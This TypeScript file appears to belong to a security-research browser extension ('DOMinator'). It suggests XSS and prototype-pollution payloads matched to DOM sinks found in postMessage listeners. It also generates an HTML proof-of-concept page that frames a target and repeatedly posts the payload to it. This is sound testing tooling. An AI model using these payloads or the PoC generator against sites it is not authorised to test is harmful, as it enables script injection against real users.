import { ExtensionListenerMessage } from '@src/shared/types/message';

export interface PayloadTemplate {
  label: string;
  /** Payload text. */
  value: string;
  /** Whether `value` is JSON to be parsed, or a raw string. */
  mode: 'json' | 'text';
  /** Short reason this template fits. */
  hint: string;
}

const XSS_HTML = '<img src=x onerror=alert(document.domain)>';
const XSS_SVG = '<svg onload=alert(document.domain)>';
const XSS_JS = 'alert(document.domain)';
const XSS_URL = 'javascript:alert(document.domain)';
const PROTO_POLLUTION = '{"__proto__":{"dominatorPolluted":true}}';

/** Suggests payloads to try, ordered by how well they match the found sinks. */
export function payloadTemplates(sinks: string[]): PayloadTemplate[] {
  const has = (fragment: string) => sinks.some(sink => sink.indexOf(fragment) !== -1);
  const templates: PayloadTemplate[] = [];

  if (
    has('innerHTML') ||
    has('outerHTML') ||
    has('insertAdjacentHTML') ||
    has('write') ||
    has('srcdoc') ||
    has('html')
  ) {
    templates.push({ label: 'HTML XSS', value: XSS_HTML, mode: 'text', hint: 'markup sink' });
    templates.push({ label: 'SVG onload', value: XSS_SVG, mode: 'text', hint: 'markup sink' });
  }
  if (has('eval') || has('Function') || has('setTimeout') || has('setInterval')) {
    templates.push({ label: 'JS expression', value: XSS_JS, mode: 'text', hint: 'code sink' });
  }
  if (has('location') || has('src') || has('href') || has('action')) {
    templates.push({ label: 'javascript: URL', value: XSS_URL, mode: 'text', hint: 'navigation sink' });
  }
  // Always useful regardless of the detected sinks.
  templates.push({ label: 'Prototype pollution', value: PROTO_POLLUTION, mode: 'json', hint: 'object merge' });
  if (templates.length === 1) {
    templates.unshift({ label: 'HTML XSS', value: XSS_HTML, mode: 'text', hint: 'generic probe' });
  }
  return templates;
}

/** The strongest single payload to seed a PoC with. */
export function suggestedPayload(sinks: string[]): PayloadTemplate {
  return payloadTemplates(sinks)[0];
}

function payloadExpression(template: PayloadTemplate): string {
  if (template.mode === 'json') return template.value;
  return JSON.stringify(template.value);
}

/**
 * Builds a self-contained HTML PoC that frames the target document and fires
 * the payload at it after load. For a listener with no origin check this is a
 * working exploit skeleton; the researcher swaps in their own payload.
 */
export function buildPoc(listener: ExtensionListenerMessage, template: PayloadTemplate): string {
  const target = listener.origin || 'https://TARGET';
  const loc = listener.source
    ? `${listener.source.fileName}:${listener.source.line}:${listener.source.column}`
    : 'unknown location';
  const originNote = listener.checksOrigin
    ? 'NOTE: this listener validates event.origin — the PoC must be served from an allowed origin.'
    : 'This listener does not validate event.origin, so any page can drive it.';
  return `<!doctype html>
<html>
<head><meta charset="utf-8"><title>DOMinator PoC</title></head>
<body>
<!--
  DOMinator postMessage PoC
  Target listener registered at ${loc}
  Sinks: ${listener.sinks.length ? listener.sinks.join(', ') : 'none detected (static)'}
  ${originNote}
-->
<script>
  const TARGET = ${JSON.stringify(target)};
  const PAYLOAD = ${payloadExpression(template)};
  const frame = document.createElement('iframe');
  frame.src = TARGET;
  frame.style.cssText = 'width:800px;height:500px;border:1px solid #ccc';
  frame.onload = function () {
    // Fire a few times in case the listener attaches slightly after load.
    let tries = 0;
    const id = setInterval(function () {
      frame.contentWindow.postMessage(PAYLOAD, '*');
      if (++tries >= 5) clearInterval(id);
    }, 300);
  };
  document.body.appendChild(frame);
</script>
</body>
</html>`;
}
